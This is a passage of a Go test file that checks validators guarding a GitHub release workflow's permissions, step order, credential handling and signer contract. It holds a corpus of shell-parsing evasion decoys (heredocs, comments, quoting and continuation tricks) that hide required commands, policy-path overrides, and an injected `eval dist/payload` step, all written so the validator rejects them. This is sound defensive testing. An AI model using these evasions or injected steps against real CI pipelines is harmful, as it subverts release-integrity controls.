// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Omkhar Arasaratnam

package metadatautil_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/omkhar/workcell/internal/metadatautil"
)

func installWorkflowToolStubs(t *testing.T, root string) {
	t.Helper()

	binDir := filepath.Join(root, "test-bin")
	if err := os.MkdirAll(binDir, 0o755); err != nil {
		t.Fatalf("MkdirAll(test-bin) error = %v", err)
	}
	for _, name := range []string{"actionlint", "zizmor"} {
		path := filepath.Join(binDir, name)
		if err := os.WriteFile(path, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
			t.Fatalf("WriteFile(%s) error = %v", path, err)
		}
	}
	if err := os.MkdirAll(filepath.Join(root, ".github"), 0o755); err != nil {
		t.Fatalf("MkdirAll(.github) error = %v", err)
	}
	if err := os.WriteFile(filepath.Join(root, ".github", "zizmor.yml"), []byte("rules: []\n"), 0o644); err != nil {
		t.Fatalf("WriteFile(zizmor.yml) error = %v", err)
	}
	t.Setenv("PATH", binDir+string(os.PathListSeparator)+os.Getenv("PATH"))
}

func TestValidateReleaseWorkflowPublicationGate(t *testing.T) {
	const workflow = `jobs:
  release:
    permissions:
      contents: read
  sign-release:
    environment:
      name: release
  verify-release-outputs:
    needs:
      - tag-policy
      - sign-release
    permissions:
      actions: read
      attestations: read
      contents: read
      packages: read
    steps:
      - run: ./scripts/verify-release-outputs.sh
  publish-github-release:
    needs:
      - tag-policy
      - sign-release
      - verify-release-outputs
    environment:
      name: hosted-controls-audit
    permissions:
      actions: read
      attestations: read
      contents: write
      packages: read
    steps:
      - name: Recheck hosted controls and publish GitHub release assets
        env:
          GITHUB_TOKEN: ${{ github.token }}
          WORKCELL_HOSTED_CONTROLS_REQUIRED: "1"
          WORKCELL_HOSTED_CONTROLS_TOKEN: ${{ secrets.WORKCELL_HOSTED_CONTROLS_TOKEN }}
        run: |
          ./scripts/run-hosted-controls-audit.sh "${GITHUB_REPOSITORY}"
          unset WORKCELL_HOSTED_CONTROLS_TOKEN
          ./scripts/publish-github-release.sh "${RELEASE_TAG}" \
            --expected-tag-object "${RELEASE_TAG_OBJECT}" \
            --immutable-releases-preverified-by-hosted-controls \
            dist/workcell.tar.gz
`
	if err := metadatautil.ValidateReleaseWorkflowPublicationGate(workflow); err != nil {
		t.Fatalf("ValidateReleaseWorkflowPublicationGate() error = %v", err)
	}
	for _, tc := range []struct {
		name, old, replacement, want string
	}{
		{name: "artifact job stays read-only", old: "contents: read", replacement: "contents: write", want: "read-only"},
		{name: "publisher depends on sealed artifacts", old: "      - sign-release\n      - verify-release-outputs", replacement: "      - preflight\n      - verify-release-outputs", want: "depend directly"},
		{name: "verifier depends on sealed artifacts", old: "      - sign-release\n    permissions:", replacement: "      - preflight\n    permissions:", want: "depend directly"},
		{name: "depends on verified artifacts", old: "      - verify-release-outputs\n    environment:", replacement: "      - preflight\n    environment:", want: "depend directly"},
		{name: "verifies sealed outputs", old: "      - run: ./scripts/verify-release-outputs.sh", replacement: "      - run: true", want: "must run verify-release-outputs.sh"},
		{name: "rejects a commented verifier mention", old: "      - run: ./scripts/verify-release-outputs.sh", replacement: "      - run: \"# ./scripts/verify-release-outputs.sh\"", want: "must run verify-release-outputs.sh"},
		{name: "rejects an echoed verifier mention", old: "      - run: ./scripts/verify-release-outputs.sh", replacement: "      - run: echo ./scripts/verify-release-outputs.sh", want: "must run verify-release-outputs.sh"},
		{name: "uses audit environment", old: "name: hosted-controls-audit", replacement: "name: release", want: "hosted-controls-audit"},
		{name: "minimal publisher permissions", old: "contents: write\n      packages: read", replacement: "contents: write\n      packages: write", want: "grant only read verification permissions"},
		{name: "minimal verifier permissions", old: "contents: read\n      packages: read", replacement: "contents: read\n      packages: write", want: "grant only read permissions"},
		{name: "unsets audit token", old: "unset WORKCELL_HOSTED_CONTROLS_TOKEN", replacement: "true", want: "unset its credential"},
		{name: "audits the repository and nothing else", old: "run-hosted-controls-audit.sh \"${GITHUB_REPOSITORY}\"", replacement: "run-hosted-controls-audit.sh wrong \"${GITHUB_REPOSITORY}\" || true", want: "recheck hosted controls"},
		{name: "explicit handoff", old: "--immutable-releases-preverified-by-hosted-controls", replacement: "--other", want: "explicit preverified publisher"},
		{name: "publisher bound to the verified tag object", old: `--expected-tag-object "${RELEASE_TAG_OBJECT}"`, replacement: `--expected-tag-object "${GITHUB_REF_NAME}"`, want: "explicit preverified publisher"},
		{name: "publisher bound to the verified tag", old: `publish-github-release.sh "${RELEASE_TAG}"`, replacement: `publish-github-release.sh "${GITHUB_REF_NAME}"`, want: "explicit preverified publisher"},
		{name: "reviewed hosted-controls policy path", old: "WORKCELL_HOSTED_CONTROLS_REQUIRED", replacement: "WORKCELL_GITHUB_HOSTED_CONTROLS_POLICY_PATH", want: "reviewed GitHub hosted-controls policy path"},
		{
			name: "tag-object binding moved from the publisher command into a comment",
			old: "            --expected-tag-object \"${RELEASE_TAG_OBJECT}\" \\\n" +
				"            --immutable-releases-preverified-by-hosted-controls \\\n" +
				"            dist/workcell.tar.gz\n",
			replacement: "            --immutable-releases-preverified-by-hosted-controls \\\n" +
				"            dist/workcell.tar.gz # --expected-tag-object \"${RELEASE_TAG_OBJECT}\"\n",
			want: "explicit preverified publisher",
		},
		{
			name: "tag-object binding moved past a shell separator",
			old: "            --expected-tag-object \"${RELEASE_TAG_OBJECT}\" \\\n" +
				"            --immutable-releases-preverified-by-hosted-controls \\\n" +
				"            dist/workcell.tar.gz\n",
			replacement: "            --immutable-releases-preverified-by-hosted-controls \\\n" +
				"            dist/workcell.tar.gz ; : --expected-tag-object \"${RELEASE_TAG_OBJECT}\"\n",
			want: "explicit preverified publisher",
		},
		{name: "preverified flag in the position the publisher reads", old: "--expected-tag-object \"${RELEASE_TAG_OBJECT}\" \\\n            --immutable-releases-preverified-by-hosted-controls \\\n            dist/workcell.tar.gz", replacement: "--expected-tag-object \"${RELEASE_TAG_OBJECT}\" \\\n            dist/workcell.tar.gz \\\n            --immutable-releases-preverified-by-hosted-controls", want: "explicit preverified publisher"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			mutated := strings.Replace(workflow, tc.old, tc.replacement, 1)
			if mutated == workflow {
				t.Fatalf("mutation %q did not change the workflow", tc.name)
			}
			err := metadatautil.ValidateReleaseWorkflowPublicationGate(mutated)
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("ValidateReleaseWorkflowPublicationGate() error = %v, want %q", err, tc.want)
			}
		})
	}
}

// A comment that names the reviewed policy path overrides nothing, so the gate
// must not reject the workflow for mentioning it.
func TestValidateReleaseWorkflowPublicationGateAcceptsPolicyPathMention(t *testing.T) {
	workflow := string(readReleaseWorkflow(t))
	const auditCall = `          ./scripts/run-hosted-controls-audit.sh "${GITHUB_REPOSITORY}"`
	mutated := strings.Replace(workflow,
		auditCall,
		"          # WORKCELL_GITHUB_HOSTED_CONTROLS_POLICY_PATH must stay unset in this job.\n"+auditCall, 1)
	if mutated == workflow {
		t.Fatal("policy path mention did not change the workflow")
	}
	if err := metadatautil.ValidateReleaseWorkflowPublicationGate(mutated); err != nil {
		t.Fatalf("ValidateReleaseWorkflowPublicationGate() error = %v, want nil", err)
	}
}

// An override reaches the audit through any executable assignment, including an
// env or export command prefix, so each of those forms must fail the gate.
func TestValidateReleaseWorkflowPublicationGateRejectsPolicyPathOverrides(t *testing.T) {
	workflow := string(readReleaseWorkflow(t))
	const auditCall = `          ./scripts/run-hosted-controls-audit.sh "${GITHUB_REPOSITORY}"`
	for name, override := range map[string]string{
		"env command prefix":       `          env WORKCELL_GITHUB_HOSTED_CONTROLS_POLICY_PATH=/tmp/policy.toml ./scripts/run-hosted-controls-audit.sh "${GITHUB_REPOSITORY}"`,
		"env with an option":       `          env -i WORKCELL_GITHUB_HOSTED_CONTROLS_POLICY_PATH=/tmp/policy.toml ./scripts/run-hosted-controls-audit.sh "${GITHUB_REPOSITORY}"`,
		"plain assignment prefix":  `          WORKCELL_GITHUB_HOSTED_CONTROLS_POLICY_PATH=/tmp/policy.toml ./scripts/run-hosted-controls-audit.sh "${GITHUB_REPOSITORY}"`,
		"export statement":         "          export WORKCELL_GITHUB_HOSTED_CONTROLS_POLICY_PATH=/tmp/policy.toml\n" + auditCall,
		"single-quoted assignment": `          env 'WORKCELL_GITHUB_HOSTED_CONTROLS_POLICY_PATH=/tmp/policy.toml' ./scripts/run-hosted-controls-audit.sh "${GITHUB_REPOSITORY}"`,
		"double-quoted assignment": `          env "WORKCELL_GITHUB_HOSTED_CONTROLS_POLICY_PATH=/tmp/policy.toml" ./scripts/run-hosted-controls-audit.sh "${GITHUB_REPOSITORY}"`,
		"quoted assignment prefix": `          'WORKCELL_GITHUB_HOSTED_CONTROLS_POLICY_PATH=/tmp/policy.toml' ./scripts/run-hosted-controls-audit.sh "${GITHUB_REPOSITORY}"`,
		"declare -x export":        "          declare -x WORKCELL_GITHUB_HOSTED_CONTROLS_POLICY_PATH=/tmp/policy.toml\n" + auditCall,
		"readonly export":          "          readonly WORKCELL_GITHUB_HOSTED_CONTROLS_POLICY_PATH=/tmp/policy.toml\n" + auditCall,
	} {
		t.Run(name, func(t *testing.T) {
			mutated := strings.Replace(workflow, auditCall, override, 1)
			if mutated == workflow {
				t.Fatalf("override %q did not change the workflow", name)
			}
			err := metadatautil.ValidateReleaseWorkflowPublicationGate(mutated)
			if err == nil || !strings.Contains(err.Error(), "reviewed GitHub hosted-controls policy path") {
				t.Fatalf("ValidateReleaseWorkflowPublicationGate() error = %v, want a policy path override", err)
			}
		})
	}
}

func TestValidateReleaseWorkflowAuthoritySplit(t *testing.T) {
	content := readReleaseWorkflow(t)
	if err := metadatautil.ValidateReleaseWorkflowAuthoritySplit(string(content)); err != nil {
		t.Fatalf("ValidateReleaseWorkflowAuthoritySplit() error = %v", err)
	}
	mutated := strings.Replace(string(content), "    permissions:\n      contents: read\n    outputs:\n      digest: ${{ steps.build_amd64.outputs.digest }}", "    permissions:\n      contents: read\n      packages: write\n    outputs:\n      digest: ${{ steps.build_amd64.outputs.digest }}", 1)
	requireReleaseAuthorityError(t, mutated, "build-amd64-image")
	const signerRecheck = "      - name: Recheck release tag before signing and image mutation"
	mutated = strings.Replace(string(content), signerRecheck, "      - uses: actions/checkout@bad\n"+signerRecheck, 1)
	if mutated == string(content) {
		t.Fatal("signer contract mutation did not change the workflow")
	}
	requireReleaseAuthorityError(t, mutated, "exact privileged step contract")
}

// TestValidateReleaseWorkflowAuthoritySplitRejectsEvasions runs the shared
// evasion corpus against each command the release assembly step must run. Both
// anchors of validateReleaseAssembly are covered, so a parser change that
// stops reading one of them fails here rather than in review.
func TestValidateReleaseWorkflowAuthoritySplitRejectsEvasions(t *testing.T) {
	workflow := string(readReleaseWorkflow(t))
	t.Run("platform copies", func(t *testing.T) {
		RequireRejectsAllEvasions(t, workflow,
			"          oras cp --recursive --from-oci-layout \\\n"+
				"            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n"+
				"            --to-oci-layout dist/release-image:amd64\n"+
				"          oras cp --recursive --from-oci-layout \\\n"+
				"            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n"+
				"            --to-oci-layout dist/release-image:arm64",
			"copy both platform images", metadatautil.ValidateReleaseWorkflowAuthoritySplit)
	})
	t.Run("multi-arch index", func(t *testing.T) {
		RequireRejectsAllEvasions(t, workflow,
			"          oras manifest index create --oci-layout \\\n"+
				"            \"dist/release-image:${RELEASE_TAG}\" \\\n"+
				"            amd64 arm64 >/dev/null",
			"assemble the multi-arch index", metadatautil.ValidateReleaseWorkflowAuthoritySplit)
	})
}

// TestValidateReleaseWorkflowPublicationGateRejectsEvasions runs the shared
// evasion corpus against each command the publication gate must find running.
// The gate guards the credential that publishes a release, so a comment, a
// heredoc body, an unrun branch or a longer command name must never satisfy it.
func TestValidateReleaseWorkflowPublicationGateRejectsEvasions(t *testing.T) {
	workflow := string(readReleaseWorkflow(t))
	const recheck = "recheck hosted controls"
	t.Run("release output verification", func(t *testing.T) {
		RequireRejectsAllEvasions(t, workflow,
			"          ./scripts/verify-release-outputs.sh \"${verify_args[@]}\"",
			"must run verify-release-outputs.sh", metadatautil.ValidateReleaseWorkflowPublicationGate)
	})
	t.Run("hosted controls audit", func(t *testing.T) {
		RequireRejectsAllEvasions(t, workflow,
			"          ./scripts/run-hosted-controls-audit.sh \"${GITHUB_REPOSITORY}\"",
			recheck, metadatautil.ValidateReleaseWorkflowPublicationGate)
	})
	t.Run("credential unset", func(t *testing.T) {
		RequireRejectsAllEvasions(t, workflow,
			"          unset WORKCELL_HOSTED_CONTROLS_TOKEN",
			recheck, metadatautil.ValidateReleaseWorkflowPublicationGate)
	})
	t.Run("preverified publisher", func(t *testing.T) {
		RequireRejectsAllEvasions(t, workflow,
			"          ./scripts/publish-github-release.sh \"${RELEASE_TAG}\" \\\n"+
				"            --expected-tag-object \"${RELEASE_TAG_OBJECT}\" \\\n"+
				"            --immutable-releases-preverified-by-hosted-controls",
			recheck, metadatautil.ValidateReleaseWorkflowPublicationGate)
	})
}

// TestValidateReleaseWorkflowPublicationGateComparesParsedOrder proves the gate
// reads the order bash reaches the three commands, not the order their names
// first appear as text. A comment naming them in the required order must not
// cover a step that mutates the release before the hosted-controls recheck.
func TestValidateReleaseWorkflowPublicationGateComparesParsedOrder(t *testing.T) {
	workflow := string(readReleaseWorkflow(t))
	const ordered = "          ./scripts/run-hosted-controls-audit.sh \"${GITHUB_REPOSITORY}\"\n" +
		"          unset WORKCELL_HOSTED_CONTROLS_TOKEN\n"
	swapped := "          # order: ./scripts/run-hosted-controls-audit.sh\n" +
		"          # then: unset WORKCELL_HOSTED_CONTROLS_TOKEN\n" +
		"          # then: ./scripts/publish-github-release.sh\n" +
		"          unset WORKCELL_HOSTED_CONTROLS_TOKEN\n" +
		"          ./scripts/run-hosted-controls-audit.sh \"${GITHUB_REPOSITORY}\"\n"
	mutated := strings.Replace(workflow, ordered, swapped, 1)
	if mutated == workflow {
		t.Fatal("the publication step no longer carries the audit and unset lines this test rewrites")
	}
	err := metadatautil.ValidateReleaseWorkflowPublicationGate(mutated)
	if err == nil || !strings.Contains(err.Error(), "recheck hosted controls") {
		t.Fatalf("ValidateReleaseWorkflowPublicationGate() error = %v, want a recheck order failure", err)
	}
}

func TestValidateReleaseWorkflowAuthoritySplitRejectsCommentDecoys(t *testing.T) {
	workflow := string(readReleaseWorkflow(t))
	decoys := []struct {
		name, old, decoy, want string
	}{
		{
			name:  "assembly command in a comment",
			old:   "          oras manifest index create --oci-layout \\\n            \"dist/release-image:${RELEASE_TAG}\" \\\n            amd64 arm64 >/dev/null",
			decoy: "          # oras manifest index create --oci-layout dist/release-image amd64 arm64",
			want:  "assemble the multi-arch index",
		},
		{
			name:  "handoff validation renamed to a comment",
			old:   "      - name: Validate privileged handoff",
			decoy: "      - name: Unpack downloads # Validate privileged handoff",
			want:  "validate the privileged handoff",
		},
		{
			name:  "bound subject download dropped",
			old:   "          artifact-ids: ${{ needs.bind-release-subjects.outputs.artifact_id }}\n          path: trusted-subjects",
			decoy: "          name: workcell-release-preflight-subjects\n          path: trusted-subjects",
			want:  "by immutable id",
		},
		{
			name:  "assembly command quoted inside another command",
			old:   "          oras manifest index create --oci-layout \\\n            \"dist/release-image:${RELEASE_TAG}\" \\\n            amd64 arm64 >/dev/null",
			decoy: "          echo \"oras manifest index create --oci-layout dist/release-image amd64 arm64\"",
			want:  "assemble the multi-arch index",
		},
		{
			name:  "assembly flag extended into a different flag",
			old:   "          oras manifest index create --oci-layout \\",
			decoy: "          oras manifest index create --oci-layout-disabled \\",
			want:  "assemble the multi-arch index",
		},
		{
			name: "platform copies left only in the subject binder job",
			old: "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64",
			decoy: "          # copies now happen in bind-release-subjects",
			want:  "copy both platform images",
		},
		{
			name:  "one platform copy dropped from the release job",
			old:   "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64",
			decoy: "          true",
			want:  "copy both platform images",
		},
		{
			name: "real commands replaced by a heredoc body naming them",
			old: "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout \\\n            \"dist/release-image:${RELEASE_TAG}\" \\\n            amd64 arm64 >/dev/null",
			decoy: "          cat <<'PLAN' >/dev/null\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout dist/release-image amd64 arm64\n" +
				"          PLAN",
			want: "copy both platform images",
		},
		{
			name: "real commands replaced by the second body of two heredocs",
			old: "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout \\\n            \"dist/release-image:${RELEASE_TAG}\" \\\n            amd64 arm64 >/dev/null",
			decoy: "          cat <<'NOTE' <<'PLAN' >/dev/null\n" +
				"          NOTE\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout dist/release-image amd64 arm64\n" +
				"          PLAN",
			want: "copy both platform images",
		},
		{
			name: "real commands hidden behind a quoted delimiter that desynchronises the queue",
			old: "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout \\\n            \"dist/release-image:${RELEASE_TAG}\" \\\n            amd64 arm64 >/dev/null",
			decoy: "          : <<'A' \"text <<B\"\n" +
				"          A\n" +
				"          cat <<'PLAN' >/dev/null\n" +
				"          B\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout dist/release-image amd64 arm64\n" +
				"          PLAN",
			want: "copy both platform images",
		},
		{
			name: "destinations moved inside a quoted argument the shell never reads as options",
			old: "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64",
			decoy: "          oras cp --recursive --from-oci-layout 'x --to-oci-layout dist/release-image:amd64 x' || true\n" +
				"          oras cp --recursive --from-oci-layout 'x --to-oci-layout dist/release-image:arm64 x' || true",
			want: "copy both platform images",
		},
		{
			name: "real commands hidden behind a delimiter an escaped quote appears to quote",
			old: "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout \\\n            \"dist/release-image:${RELEASE_TAG}\" \\\n            amd64 arm64 >/dev/null",
			decoy: "          : \\' <<PLAN ''\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout dist/release-image amd64 arm64\n" +
				"          PLAN",
			want: "copy both platform images",
		},
		{
			name: "copies renamed to a command bash never runs by a backslash in double quotes",
			old: "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64",
			decoy: "          \"or\\as\" cp --recursive --from-oci-layout --to-oci-layout dist/release-image:amd64 || true\n" +
				"          \"or\\as\" cp --recursive --from-oci-layout --to-oci-layout dist/release-image:arm64 || true",
			want: "copy both platform images",
		},
		{
			name: "destinations exposed by a command substitution inside the quoted argument",
			old: "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64",
			decoy: "          oras cp --recursive --from-oci-layout \"$(printf x)\\ # --to-oci-layout dist/release-image:amd64 ignored\" || true\n" +
				"          oras cp --recursive --from-oci-layout \"$(printf x)\\ # --to-oci-layout dist/release-image:arm64 ignored\" || true",
			want: "copy both platform images",
		},
		{
			name: "real commands moved into a heredoc a quoted command substitution opens",
			old: "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout \\\n            \"dist/release-image:${RELEASE_TAG}\" \\\n            amd64 arm64 >/dev/null",
			decoy: "          printf '%s' \"$(cat <<PLAN\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout dist/release-image amd64 arm64\n" +
				"          PLAN\n" +
				"          )\"",
			want: "copy both platform images",
		},
		{
			name: "real commands hidden behind an indented terminator bash never reads as one",
			old: "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout \\\n            \"dist/release-image:${RELEASE_TAG}\" \\\n            amd64 arm64 >/dev/null",
			decoy: "          cat <<PLAN >/dev/null\n" +
				"            PLAN\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout dist/release-image amd64 arm64\n" +
				"          PLAN",
			want: "copy both platform images",
		},
		{
			name: "real commands hidden behind a space-indented terminator of a tab-stripped body",
			old: "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout \\\n            \"dist/release-image:${RELEASE_TAG}\" \\\n            amd64 arm64 >/dev/null",
			decoy: "          cat <<-PLAN >/dev/null\n" +
				"            PLAN\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout --to-oci-layout dist/release-image:arm64\n" +
				"          oras manifest index create --oci-layout dist/release-image amd64 arm64\n" +
				"          PLAN",
			want: "copy both platform images",
		},
		{
			name: "destinations moved onto a line a space after the backslash detaches",
			old: "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64",
			decoy: "          oras cp --recursive --from-oci-layout \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\ \n" +
				"          --to-oci-layout dist/release-image:amd64 || true\n" +
				"          oras cp --recursive --from-oci-layout \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\ \n" +
				"          --to-oci-layout dist/release-image:arm64 || true",
			want: "copy both platform images",
		},
		{
			name: "destinations joined to their option by a continuation that inserts no space",
			old: "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64\n" +
				"          oras cp --recursive --from-oci-layout \\\n            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:arm64",
			decoy: "          oras cp --recursive --from-oci-layout \"dist/image-amd64/layout@${AMD64_DIGEST}\" --to-oci-layout\\\n" +
				"          dist/release-image:amd64 || true\n" +
				"          oras cp --recursive --from-oci-layout \"dist/image-arm64/layout@${ARM64_DIGEST}\" --to-oci-layout\\\n" +
				"          dist/release-image:arm64 || true",
			want: "copy both platform images",
		},
		{
			name:  "copies disabled with their destinations moved into inline comments",
			old:   "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64",
			decoy: "          oras cp --recursive --from-oci-layout || true # --to-oci-layout dist/release-image:amd64",
			want:  "copy both platform images",
		},
		{
			name:  "one platform copy commented out but its destination text kept",
			old:   "          oras cp --recursive --from-oci-layout \\\n            \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            --to-oci-layout dist/release-image:amd64",
			decoy: "          # oras cp --recursive --from-oci-layout \\\n            # \"dist/image-amd64/layout@${AMD64_DIGEST}\" \\\n            # --to-oci-layout dist/release-image:amd64",
			want:  "copy both platform images",
		},
	}
	for _, decoy := range decoys {
		t.Run(decoy.name, func(t *testing.T) {
			mutated := strings.Replace(workflow, decoy.old, decoy.decoy, 1)
			if mutated == workflow {
				t.Fatalf("decoy %q did not change the workflow", decoy.name)
			}
			requireReleaseAuthorityError(t, mutated, decoy.want)
		})
	}
}

func TestValidateReleaseWorkflowAuthoritySplitRejectsSignerDrift(t *testing.T) {
	content := readReleaseWorkflow(t)
	workflow := string(content)
	mutations := []string{
		strings.Replace(workflow, "  IMAGE_NAME: ghcr.io/${{ github.repository }}", "  IMAGE_NAME: ghcr.io/${{ github.repository_owner }}/other", 1),
		strings.Replace(workflow, "          test \"$(cut -d@ -f2 trusted-subjects/workcell-image.digest)\" = \"${EXPECTED_IMAGE_DIGEST}\"\n", "", 1),
		strings.Replace(workflow, "  WORKCELL_ORAS_VERSION: 1.3.3", "  WORKCELL_ORAS_VERSION: 1.3.4", 1),
		strings.Replace(workflow, "  WORKCELL_ORAS_LINUX_AMD64_SHA256: 9ce999f8d2de03fc03968b29d743077a58783e545e5eaa53917ca177352d0e59", "  WORKCELL_ORAS_LINUX_AMD64_SHA256: 0000000000000000000000000000000000000000000000000000000000000000", 1),
		strings.Replace(workflow, "(cd dist && sha256sum -c SHA256SUMS)", "sha256sum -c dist/SHA256SUMS", 1),
		strings.Replace(workflow, "      BUNDLE_NAME: workcell-${{ needs.tag-policy.outputs.release_tag }}.tar.gz", "      BUNDLE_NAME: workcell-${{ needs.tag-policy.outputs.release_tag }}.tar.gz\n      EXTRA: forbidden", 1),
		strings.Replace(workflow, "      - name: Sign release image", "      - name: Unexpected command\n        run: eval dist/payload\n\n      - name: Sign release image", 1),
		strings.Replace(workflow, "    shell: bash --noprofile --norc -euo pipefail {0}", "    shell: bash {0}", 1),
	}
	for _, mutated := range mutations {
		requireReleaseAuthorityError(t, mutated, "exact privileged step contract")
	}
}

func readReleaseWorkflow(t *testing.T) []byte {
	t.Helper()
	content, err := os.ReadFile(filepath.Join("..", "..", ".github", "workflows", "release.yml"))
	if err != nil {
		t.Fatal(err)
	}
	return content
}

func requireReleaseAuthorityError(t *testing.T, workflow, want string) {
	t.Helper()
	err := metadatautil.ValidateReleaseWorkflowAuthoritySplit(workflow)
	if err == nil || !strings.Contains(err.Error(), want) {
		t.Fatalf("ValidateReleaseWorkflowAuthoritySplit() error = %v, want %q", err, want)
	}
}

func writeWorkflowValidationFixtures(t *testing.T, workflowDir string) {
	t.Helper()

	if err := os.WriteFile(filepath.Join(workflowDir, "codeql.yml"), []byte(`name: CodeQL

on:
  workflow_dispatch:

jobs:
  analyze:
    strategy:
      matrix:
        include:
          - language: rust
            build-mode: none
          - language: javascript-typescript
            build-mode: none
          - language: go
            build-mode: autobuild
    steps:
      - uses: github/codeql-action/init@deadbeef
      - uses: github/codeql-action/autobuild@deadbeef
      - uses: github/codeql-action/analyze@deadbeef
`), 0o644); err != nil {
		t.Fatalf("WriteFile(codeql.yml) error = %v", err)
	}

	if err := os.WriteFile(filepath.Join(workflowDir, "release.yml"), []byte(`name: Release

on:
  workflow_dispatch:

jobs:
  codeql-preflight:
    name: Release CodeQL (${{ matrix.language }})
    strategy:
      matrix:
        include:
          - language: rust
